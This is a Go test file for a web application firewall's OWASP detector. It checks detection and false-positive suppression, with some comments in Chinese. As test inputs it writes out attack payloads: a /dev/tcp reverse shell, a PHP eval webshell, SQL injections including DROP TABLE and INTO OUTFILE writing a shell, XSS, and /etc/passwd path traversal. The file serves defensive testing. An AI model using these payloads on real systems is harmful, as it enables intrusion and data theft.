package waf

import (
	"strings"
	"testing"
)

func TestCheckOWASP_SQLi(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1' UNION SELECT * FROM users--", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected SQLi hit")
	}
	if hits[0].Category != CatSQLi {
		t.Fatalf("expected sqli category, got %s", hits[0].Category)
	}
}

func TestCheckOWASP_SQLi_Low(t *testing.T) {
	// Low sensitivity requires higher score, simple comment alone shouldn't trigger
	hits := CheckOWASP("low", "/page", "q=hello--", nil, nil)
	if len(hits) > 0 {
		t.Fatal("low sensitivity should not trigger on simple comment")
	}
}

func TestCheckOWASP_Webshell(t *testing.T) {
	hits := CheckOWASP("mid", "/upload.php", "<?php eval($_POST['cmd'])", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected webshell hit")
	}
	found := false
	for _, h := range hits {
		if h.Category == CatWebshell {
			found = true
		}
	}
	if !found {
		t.Fatal("expected webshell category")
	}
}

func TestCheckOWASP_RevShell(t *testing.T) {
	hits := CheckOWASP("mid", "/", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected reverse shell hit")
	}
	if hits[0].Category != CatRevShell {
		t.Fatalf("expected revshell, got %s", hits[0].Category)
	}
}

func TestCheckOWASP_PathTraversal(t *testing.T) {
	hits := CheckOWASP("mid", "/../../etc/passwd", "", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected path traversal hit")
	}
}

func TestCheckOWASP_XSS(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=<script>alert(1)</script>", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected XSS hit")
	}
}

func TestCheckOWASP_Clean(t *testing.T) {
	hits := CheckOWASP("mid", "/api/v1/users", "page=1&limit=10", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("expected no hits for clean request, got %d", len(hits))
	}
}

func TestNormalize(t *testing.T) {
	input := "%27%20OR%201%3D1%20--%20"
	result := normalize(input)
	if result != "' or 1=1 " {
		t.Fatalf("unexpected normalize result: %q", result)
	}
}

func TestNormalize_OverlongUTF8(t *testing.T) {
	input := "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
	result := normalize(input)
	// Overlong UTF-8 %c0%ae→"." and remaining is URL-decoded; exact output depends on decode order.
	// The key invariant: result must contain ".." for path traversal detection.
	if !strings.Contains(result, "..") || !strings.Contains(result, "etc/passwd") {
		t.Fatalf("expected overlong UTF-8 to normalize to traversal path, got %q", result)
	}
}

// ── False Positive Tests: clean requests that must NOT trigger ──

func TestCheckOWASP_Clean_URLFragment(t *testing.T) {
	hits := CheckOWASP("mid", "/page", "id=1#section", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("URL hash fragment should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_URLFragment_High(t *testing.T) {
	hits := CheckOWASP("high", "/page", "id=1#section", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("URL hash fragment should not trigger even at high sensitivity, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_CSSColors(t *testing.T) {
	hits := CheckOWASP("mid", "/style", "color=#333&font-size=14px", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("CSS color values should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_NormalJSON(t *testing.T) {
	hits := CheckOWASP("mid", "/api/users", "", nil, []string{"search term", "John Doe", "100"})
	if len(hits) > 0 {
		t.Fatalf("normal text values should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_DoubleDashSlug(t *testing.T) {
	hits := CheckOWASP("mid", "/blog/my-article--2024", "", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("double dash in URL slug should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_NormalPagination(t *testing.T) {
	hits := CheckOWASP("mid", "/api/v1/items", "page=2&limit=50&sort=name&order=desc", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("normal pagination params should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_JWTAuth(t *testing.T) {
	headers := map[string]string{
		"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
	}
	hits := CheckOWASP("mid", "/api/me", "", headers, nil)
	if len(hits) > 0 {
		t.Fatalf("JWT auth header should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_UUIDParam(t *testing.T) {
	hits := CheckOWASP("mid", "/api/resource", "id=550e8400-e29b-41d4-a716-446655440000", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("UUID parameter should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_FilenamePath(t *testing.T) {
	hits := CheckOWASP("mid", "/files/reports/q1-2024.pdf", "", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("normal file path should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_SearchQuery(t *testing.T) {
	hits := CheckOWASP("mid", "/search", "q=how+to+build+a+website&page=1", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("normal search query should not trigger, got %+v", hits)
	}
}

// ── 新增检测能力测试 ──

// GROUP BY 注入 — 之前因 hasSQLiIndicator 缺少 "group by" 而漏报
func TestCheckOWASP_SQLi_GroupBy(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 GROUP BY 1--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for GROUP BY column enumeration")
	}
}

// 堆叠查询含 SELECT — 之前 sqli:004 不包含 SELECT 而漏报
func TestCheckOWASP_SQLi_StackedSelect(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1; SELECT user()--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for stacked SELECT query")
	}
}

// 子查询比较 — 新模式 sqli:031
func TestCheckOWASP_SQLi_SubqueryComparison(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1=(SELECT 1 FROM users)", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for subquery comparison")
	}
}

// Blind SQLi 假条件（AND 1=2）— 之前被 isSQLiFalsePositive 过度抑制
func TestCheckOWASP_SQLi_BlindFalseCondition(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 AND 1=2", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for blind false condition (AND 1=2)")
	}
}

// SSRF localhost 在 mid 敏感度下必须触发 — 之前 score=3 在 mid 下不触发
func TestCheckOWASP_SSRF_LocalhostMidSensitivity(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=http://127.0.0.1/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for localhost at mid sensitivity")
	}
}

// 私有 IP 无 URL 上下文不触发 — 之前 score 3+3=6 会误报
func TestCheckOWASP_SSRF_PrivateIPNoURLContext(t *testing.T) {
	hits := CheckOWASP("mid", "/network", "src_ip=10.0.0.1&dst_ip=192.168.1.1", nil, nil)
	if hasCategory(hits, CatSSRF) {
		t.Fatal("bare private IPs without URL scheme should not trigger SSRF")
	}
}

// 私有 IP 有 URL 上下文必须触发
func TestCheckOWASP_SSRF_PrivateIPWithURLContext(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=http://192.168.1.1/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for private IP with http:// scheme")
	}
}

// JavaScript ";delete" 不触发 SQLi — sqli:004 新增 FP 抑制
func TestCheckOWASP_Clean_JSDelete(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{"cache.clear(); delete tempObj"})
	if hasCategory(hits, CatSQLi) {
		t.Fatal("JavaScript ';delete' without SQL structural context should not trigger SQLi")
	}
}

// 含 table 关键字的堆叠 DROP 必须触发
func TestCheckOWASP_SQLi_DropTable(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1; DROP TABLE users--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for DROP TABLE")
	}
}

// XSS 事件处理器无 < 标签（注入现有属性场景）
func TestCheckOWASP_XSS_BareEventHandler(t *testing.T) {
	hits := CheckOWASP("mid", "/", `name=" onmouseover="alert(1)`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for bare event handler injection into attribute context")
	}
}

// CMD 注入：URL 参数 ;id=123 不触发（最常见误报场景）
func TestCheckOWASP_Clean_URLParamSemicolonID(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "action=submit;id=123&type=user", nil, nil)
	if hasCategory(hits, CatCmdInject) {
		t.Fatal("URL parameter 'action=submit;id=123' should not trigger cmd injection")
	}
}

// CMD 注入：; id 在行尾（真实攻击）仍然触发
func TestCheckOWASP_CmdInject_SemicolonIDAtEnd(t *testing.T) {
	hits := CheckOWASP("mid", "/ping", "host=8.8.8.8;id", nil, nil)
	if !hasCategory(hits, CatCmdInject) {
		t.Fatal("expected cmd injection hit for 'host=8.8.8.8;id' at end of string")
	}
}

// CMD 注入：pipe 后跟 =value 不触发
func TestCheckOWASP_Clean_PipeEqualsParam(t *testing.T) {
	hits := CheckOWASP("mid", "/filter", "a=1&b=x|id=5&c=y", nil, nil)
	if hasCategory(hits, CatCmdInject) {
		t.Fatal("'|id=5' as URL parameter should not trigger cmd injection")
	}
}

// ── 新增误报抑制验证测试 ──

// XSS：SVG图标 + iframe嵌入（常见于CMS富文本）不应触发
func TestCheckOWASP_Clean_SVGAndIframe(t *testing.T) {
	body := `<svg xmlns="http://www.w3.org/2000/svg" width="24"><path d="M10 20"/></svg>` +
		`<iframe src="https://youtube.com/embed/abc123" allowfullscreen></iframe>`
	hits := CheckOWASP("mid", "/post", "", nil, []string{body})
	if hasCategory(hits, CatXSS) {
		t.Fatalf("SVG icon + iframe embed in rich HTML should not trigger XSS at mid sensitivity, got %+v", hits)
	}
}

// XSS：SVG + embed 无事件处理器，mid 敏感度不应触发
func TestCheckOWASP_Clean_SVGAndEmbed(t *testing.T) {
	body := `<svg width="100"><circle cx="50" cy="50" r="40"/></svg>` +
		`<embed src="/docs/report.pdf" type="application/pdf" width="600" height="400">`
	hits := CheckOWASP("mid", "/view", "", nil, []string{body})
	if hasCategory(hits, CatXSS) {
		t.Fatalf("SVG + PDF embed without event handlers should not trigger XSS, got %+v", hits)
	}
}

// XSS：高敏感度 <base href> 仍然检出（保持高敏模式有效性）
func TestCheckOWASP_XSS_BaseHrefHighSensitivity(t *testing.T) {
	hits := CheckOWASP("high", "/", `q=<base href="https://evil.com/">`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("base href injection should still trigger at high sensitivity")
	}
}

// SQLi：文本中的 GROUP BY 无 SQL 终止符不应触发
func TestCheckOWASP_Clean_GroupByInText(t *testing.T) {
	body := "Use GROUP BY 1 to sort results in MySQL queries for aggregation"
	hits := CheckOWASP("mid", "/api/docs", "", nil, []string{body})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("'GROUP BY 1' in documentation text should not trigger SQLi, got %+v", hits)
	}
}

// SQLi：GROUP BY 带 -- 注释仍然检出
func TestCheckOWASP_SQLi_GroupByWithComment(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 GROUP BY 1--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("GROUP BY with SQL comment should still trigger SQLi")
	}
}

// ── sqli:022 和 sqli:003 误报抑制测试 ──

// sqli:022: if(length) 作为 JavaScript 变量检查不触发
func TestCheckOWASP_Clean_JSIfLength(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{"if (length === 0) return null;"})
	if hasCategory(hits, CatSQLi) {
		t.Fatal("if(length) as JavaScript variable guard should not trigger SQLi")
	}
}

// sqli:022: if(count) 作为 JavaScript 变量检查不触发
func TestCheckOWASP_Clean_JSIfCount(t *testing.T) {
	hits := CheckOWASP("mid", "/", "limit=10&sort=if(count>0,asc,desc)", nil, nil)
	if hasCategory(hits, CatSQLi) {
		t.Fatal("if(count) as JavaScript comparison should not trigger SQLi")
	}
}

// sqli:022: if(ascii(...)) 仍然触发（SQL 特有函数）
func TestCheckOWASP_SQLi_IfAscii(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=if(ascii(substr(user(),1,1))=115,1,0)", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("if(ascii(substr(user()))) should still trigger SQLi")
	}
}

// sqli:022: if(length(password)>5,1,0) 作为 SQL 函数调用仍然触发
func TestCheckOWASP_SQLi_IfLengthFunc(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 and if(length(password)>5,1,0)--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("if(length(password)) SQL function call should trigger SQLi")
	}
}

// sqli:003: JavaScript sleep() 不触发
func TestCheckOWASP_Clean_JSSleep(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{
		"function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }",
	})
	if hasCategory(hits, CatSQLi) {
		t.Fatal("JavaScript sleep() function definition should not trigger SQLi")
	}
}

// sqli:003: SQL sleep() 仍然触发（有 SQL 上下文）
func TestCheckOWASP_SQLi_SleepWithContext(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 AND (SELECT sleep(5))", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("sleep() with SQL SELECT context should trigger SQLi")
	}
}

// sqli:003: 注入模式 "1); sleep(5)--" 仍然触发
func TestCheckOWASP_SQLi_SleepInjection(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1); sleep(5)--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("1); sleep(5)-- injection pattern should trigger SQLi")
	}
}

// 路径穿越: ../../etc/passwd 仍然触发
func TestCheckOWASP_PathTrav_EtcPasswdStillDetected(t *testing.T) {
	hits := CheckOWASP("mid", "/", "file=../../etc/passwd", nil, nil)
	if !hasCategory(hits, CatPathTrav) {
		t.Fatal("../../etc/passwd should still trigger path traversal")
	}
}

// ── sqli:001 suppressor tests ──

// 搜索引擎查询中含 "union select" 不触发（FP 场景：开发者在 segmentfault 搜索 SQL 语法）
func TestCheckOWASP_Clean_UnionSelectSearchQuery(t *testing.T) {
	hits := CheckOWASP("mid", "/search", "q=union+select+%E5%85%B3%E9%94%AE%E5%AD%97%E6%80%8E%E4%B9%88%E7%94%A8", nil, nil)
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("'union select' in search query without SQL markers should not trigger, got %+v", hits)
	}
}

// Bing autocomplete bq 参数含 "union select" 不触发（FP 场景）
func TestCheckOWASP_Clean_UnionSelectBingQuery(t *testing.T) {
	hits := CheckOWASP("mid", "/AS/Suggestions", "bq=site:segmentfault.com+union+select+syntax", nil, nil)
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("'union select' in Bing autocomplete bq param should not trigger, got %+v", hits)
	}
}

// 真实 UNION SELECT 带列列表仍然触发
func TestCheckOWASP_SQLi_UnionSelectColumns(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 UNION SELECT 1,2,3--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("UNION SELECT with column list should still trigger")
	}
}

// 真实 UNION SELECT FROM 仍然触发
func TestCheckOWASP_SQLi_UnionSelectFrom(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 UNION SELECT * FROM users", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("UNION SELECT FROM should still trigger")
	}
}

// 真实 UNION SELECT NULL 仍然触发
func TestCheckOWASP_SQLi_UnionSelectNull(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 UNION SELECT NULL,NULL,NULL", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("UNION SELECT NULL should still trigger")
	}
}

// ── sqli:017 suppressor tests ──

// AWS Aurora 文档 "INTO OUTFILE S3" 不触发（无引号路径）
func TestCheckOWASP_Clean_IntoOutfileS3(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"SELECT INTO OUTFILE S3 the following statement exports"})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("'INTO OUTFILE S3' without quoted path should not trigger, got %+v", hits)
	}
}

// 真实 INTO OUTFILE 带引号路径仍然触发
func TestCheckOWASP_SQLi_IntoOutfileWithPath(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=1 INTO OUTFILE '/var/www/html/shell.php'", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("INTO OUTFILE with quoted path should still trigger")
	}
}

// ── xss:002 suppressor tests ──

// CDN onload 回调参数不触发（Cloudflare Turnstile 模式）
func TestCheckOWASP_Clean_CDNOnloadCallback(t *testing.T) {
	hits := CheckOWASP("mid", "/turnstile/v0/g/api.js", "onload=_cf_chl_turnstile_l&render=explicit", nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("CDN ?onload=callback should not trigger XSS, got %+v", hits)
	}
}

// CDN onload 回调在高敏感度下也不应触发（xss:002 FP 在 threshold≤2 时绕过了 isXSSFalsePositive）
func TestCheckOWASP_Clean_CDNOnloadCallback_High(t *testing.T) {
	hits := CheckOWASP("high", "/turnstile/v0/g/api.js", "onload=_cf_chl_turnstile_l&render=explicit", nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("CDN ?onload=callback should not trigger XSS at high sensitivity, got %+v", hits)
	}
}

// reCAPTCHA onload 回调在高敏感度下也不应触发
func TestCheckOWASP_Clean_ReCaptchaOnload_High(t *testing.T) {
	hits := CheckOWASP("high", "/recaptcha/api.js", "onload=captchaOnload&render=explicit", nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("reCAPTCHA ?onload=callback should not trigger XSS at high sensitivity, got %+v", hits)
	}
}

// S3 ARN 通配符不触发 SQLi（arn:aws:s3:::bucket01/* 中 1/* 匹配 sqli:005）
func TestCheckOWASP_Clean_S3ARNWildcard(t *testing.T) {
	hits := CheckOWASP("high", "/", "source=arn:aws:s3:::sample-loaddata01/*&format=json", nil, nil)
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("S3 ARN wildcard should not trigger SQLi, got %+v", hits)
	}
}

// 真实 SQL 注入用 /* 未闭合注释仍然检出（sqli:005 /* 分支）
func TestCheckOWASP_SQLi_SlashStarComment(t *testing.T) {
	// Unclosed /* comment (not stripped by stripSQLComments) — real SQL injection probing
	hits := CheckOWASP("high", "/", "id=queryvalue1/*", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("SQL unclosed /* comment injection should still trigger SQLi")
	}
}

// Google reCAPTCHA onload 回调参数不触发
func TestCheckOWASP_Clean_ReCaptchaOnload(t *testing.T) {
	hits := CheckOWASP("mid", "/recaptcha/api.js", "onload=captchaOnload&render=explicit", nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("reCAPTCHA ?onload=callback should not trigger XSS, got %+v", hits)
	}
}

// 真实 onload=alert(1) 仍然触发
func TestCheckOWASP_XSS_OnloadAlert(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=onload=alert(1)", nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("onload=alert(1) should still trigger XSS")
	}
}

// ── sqli:006 suppressor tests ──

// CSP 报告中 'use strict'; concat(...) 不触发
func TestCheckOWASP_Clean_CSPReportUseStrict(t *testing.T) {
	hits := CheckOWASP("mid", "/api/report", "", nil, []string{
		"'use strict'; if (length > 0) { return concat(a, b); }",
	})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("CSP/NEL report with JavaScript 'use strict'; concat() should not trigger SQLi, got %+v", hits)
	}
}

// NEL 报告中裸 JS 语句不触发
func TestCheckOWASP_Clean_NELReportJS(t *testing.T) {
	hits := CheckOWASP("mid", "/csp/report.htm", "", nil, []string{
		"'strict'; if (length > 0) { return result; }",
	})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("NEL report with JavaScript should not trigger SQLi, got %+v", hits)
	}
}

// sqli:006 真实注入场景仍然触发（带 FROM 上下文）
func TestCheckOWASP_SQLi_006WithSQLContext(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1' ; SELECT * FROM users--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("sqli:006 with SELECT FROM context should still trigger")
	}
}

// sqli:006 真实注入场景仍然触发（带 DROP TABLE 上下文）
func TestCheckOWASP_SQLi_006WithDropTable(t *testing.T) {
	hits := CheckOWASP("mid", "/", "name='; DROP TABLE users--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("sqli:006 with DROP TABLE context should still trigger")
	}
}

// ── Sec-Ch-Ua 扩展请求头不触发测试 ──

// Sec-Ch-Ua-Full-Version-List 含引号和分号不触发
func TestCheckOWASP_Clean_SecChUaFullVersionList(t *testing.T) {
	headers := map[string]string{
		"Sec-Ch-Ua-Full-Version-List": `"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.199", "Google Chrome";v="114.0.5735.199"`,
		"Sec-Ch-Ua-Platform-Version":  `"14.0.0"`,
		"Sec-Ch-Ua-Arch":              `"x86"`,
	}
	hits := CheckOWASP("mid", "/AS/Suggestions", "qry=test", headers, nil)
	if len(hits) > 0 {
		t.Fatalf("extended Client Hints headers should not trigger any detection, got %+v", hits)
	}
}

// X-Client-Data 请求头（Google Chrome 发送的 base64 数据）不触发
func TestCheckOWASP_Clean_XClientData(t *testing.T) {
	headers := map[string]string{
		"X-Client-Data": "CJG2yQEIpLbJAQipncoBCMKTywEIkqHLAQj6mM0BCIWgzQEIpL3NAQ==",
	}
	hits := CheckOWASP("mid", "/recaptcha/api.js", "onload=captchaOnload&render=explicit", headers, nil)
	if hasCategory(hits, CatXSS) || hasCategory(hits, CatSQLi) {
		t.Fatalf("X-Client-Data header should not trigger any detection, got %+v", hits)
	}
}

// ── 调试测试：真实 Bing CSP 报告正文（application/reports+json）──
func TestCheckOWASP_Debug_BingCSPReport(t *testing.T) {
	// 真实 Bing CSP 报告正文（application/reports+json 内容类型，单个文本 blob 扫描）
	body := `[{"age":9694,"body":{"blockedURL":"https://r.bing.com/rp/ICf9X-WMafiZOnS_3M9RpM8994E.gz.js","disposition":"report","documentURL":"https://cn.bing.com/","effectiveDirective":"script-src-elem","lineNumber":1,"originalPolicy":"script-src https: 'strict-dynamic' 'report-sample' 'nonce-z35bKtCXz88W1OJrsFFgnLdDdiySmR6T76aMSP6v1Ec='; base-uri 'self';report-to csp-endpoint","referrer":"","sample":"","sourceFile":"https://cn.bing.com/","statusCode":200},"type":"csp-violation","url":"https://cn.bing.com/","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}]`
	hits := CheckOWASP("mid", "/api/report", "cat=bingcsp", nil, []string{body})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("Bing CSP report body should not trigger SQLi, got %+v", hits)
	}
}
